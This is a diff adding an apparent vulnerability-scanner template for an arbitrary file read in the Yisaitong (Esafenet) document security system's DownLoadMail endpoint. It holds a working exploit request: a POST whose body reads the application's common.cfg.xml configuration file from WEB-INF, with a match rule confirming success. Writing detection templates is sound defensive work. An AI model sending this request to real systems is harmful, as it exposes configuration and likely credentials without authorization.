@@ -1,0 +1,15 @@
+name: 亿赛通-电子文档安全管理系统-DownLoadMail-文件读取
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /CDGServer3/esafenet/DownLoadMail
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      path=/WEB-INF/classes/&name=common.cfg.xml
+    expression:
+      status: 200
+      body_all: ["est-configuration"]
